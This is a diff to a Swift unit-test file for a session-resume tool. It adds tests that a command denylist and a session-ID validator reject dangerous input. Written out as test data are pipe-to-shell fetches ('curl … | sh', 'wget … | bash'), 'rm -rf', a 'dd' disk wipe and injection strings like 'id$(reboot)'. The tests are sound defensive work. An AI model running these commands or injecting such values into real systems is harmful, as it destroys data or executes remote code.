@@ -173,16 +173,95 @@ final class AdaptersTests: XCTestCase {
     }
 
     func testDenylistedWatcherProducesNoOffer() {
-        // A snapshot whose argv would render to a denylisted command line.
-        let snap = SnapshotRow(exe: "watch", argv: ["watch", "sudo", "id"],
-                               adapter: "watcher", adapterState: [:])
-        // Rendered command "watch sudo id" — first token watch, not denylisted.
-        XCTAssertNotNil(Adapters.resumeOffer(for: snap))
+        // `watch` re-executes its argument: a denylisted command nested in a
+        // wrapper's argv must never be offered (FR-30).
+        for argv in [["watch", "sudo", "id"],
+                     ["watch", "rm -rf /tmp/x"],
+                     ["watch", "-n", "1", "sudo id"],
+                     ["watch", "curl x | sh"]] {
+            let snap = SnapshotRow(exe: argv[0], argv: argv,
+                                   adapter: "watcher", adapterState: [:])
+            XCTAssertNil(Adapters.resumeOffer(for: snap), "argv: \(argv)")
+        }
 
         let multiline = SnapshotRow(exe: "tail", argv: ["tail", "-f", "a\nb"],
                                     adapter: "watcher", adapterState: [:])
         XCTAssertNil(Adapters.resumeOffer(for: multiline),
                      "argv smuggling a newline must never be offered (FR-29/30)")
+
+        // Benign wrapper and non-wrapper argv still get offers.
+        for argv in [["watch", "-n", "1", "date"],
+                     ["watch", "ls -la"],
+                     ["tail", "-f", "/var/log/system.log"],
+                     ["less", "/tmp/rm"]] {  // file ARG named rm is not a command
+            let snap = SnapshotRow(exe: argv[0], argv: argv,
+                                   adapter: "watcher", adapterState: [:])
+            XCTAssertNotNil(Adapters.resumeOffer(for: snap), "argv: \(argv)")
+        }
+    }
+
+    func testDenylistArgvCatchesQuoteHiddenPipelines() {
+        // Post-quoting, `watch 'curl x | sh'` splits into bases {watch, sh'} —
+        // the raw-argv check must catch the pipeline before quoting hides it.
+        XCTAssertTrue(Adapters.isDenylisted(argv: ["watch", "curl https://x.io | sh"]))
+        XCTAssertTrue(Adapters.isDenylisted(argv: ["watch", "wget -qO- x | bash"]))
+        XCTAssertTrue(Adapters.isDenylisted(argv: ["xargs", "rm"]))
+        XCTAssertTrue(Adapters.isDenylisted(argv: ["env", "sudo", "id"]))
+        XCTAssertTrue(Adapters.isDenylisted(argv: ["nohup", "dd if=/dev/zero of=/dev/disk2"]))
+        XCTAssertTrue(Adapters.isDenylisted(argv: []))
+
+        XCTAssertFalse(Adapters.isDenylisted(argv: ["env", "FOO=1", "make"]))
+        XCTAssertFalse(Adapters.isDenylisted(argv: ["ssh", "-p", "2222", "riley@prod-01"]))
+        XCTAssertFalse(Adapters.isDenylisted(argv: ["tail", "-f", "build.log"]))
+    }
+
+    // MARK: Claude session-id hygiene (unquoted interpolation guard)
+
+    func testMalformedClaudeSessionIdFallsBackToContinue() {
+        for bad in ["abc; sudo rm -rf ~",
+                    "a b",
+                    "x'y",
+                    "id$(reboot)",
+                    "a|sh",
+                    "-rf",
+                    ""] {
+            let snap = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
+                                   adapterState: ["sessionId": bad])
+            let offer = Adapters.resumeOffer(for: snap)
+            XCTAssertEqual(offer?.command, "claude --continue",
+                           "malformed sessionId \(bad) must not be interpolated")
+        }
+        XCTAssertTrue(Adapters.isValidClaudeSessionId("6c2b41d8-90be-44f6-af3e-dda4effa24bb"))
+        XCTAssertTrue(Adapters.isValidClaudeSessionId("newest-session"))
+        XCTAssertFalse(Adapters.isValidClaudeSessionId("-starts-with-dash"))
+    }
+
+    // MARK: FR-25 — offers adjust when the cwd fell back
+
+    func testCwdUnavailableKeepsResumeWithCaveatDropsContinueAndWatchers() {
+        // claude --resume works from any cwd: kept, with the caveat labeled.
+        let resumable = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
+                                    adapterState: ["sessionId": "abcd1234-5678"])
+        let offer = Adapters.resumeOffer(for: resumable, cwdUnavailable: true)
+        XCTAssertEqual(offer?.command, "claude --resume abcd1234-5678")
+        XCTAssertTrue(offer?.label.contains("project directory unavailable") == true)
+
+        // claude --continue resumes "most recent session in THIS directory" —
+        // in a fallback directory that is the wrong session: suppressed.
+        let continuable = SnapshotRow(exe: "claude", argv: ["claude"], adapter: "claude",
+                                      adapterState: [:])
+        XCTAssertNil(Adapters.resumeOffer(for: continuable, cwdUnavailable: true))
+
+        // Watcher argv routinely holds relative paths: suppressed.
+        let watcher = SnapshotRow(exe: "tail", argv: ["tail", "-f", "build.log"],
+                                  adapter: "watcher", adapterState: [:])
+        XCTAssertNil(Adapters.resumeOffer(for: watcher, cwdUnavailable: true))
+
+        // ssh reconnect is cwd-independent: kept.
+        let ssh = SnapshotRow(exe: "/usr/bin/ssh", argv: ["ssh", "riley@prod-01"],
+                              adapter: "ssh", adapterState: [:])
+        XCTAssertEqual(Adapters.resumeOffer(for: ssh, cwdUnavailable: true)?.command,
+                       "ssh riley@prod-01")
     }
 
     // MARK: shellQuote
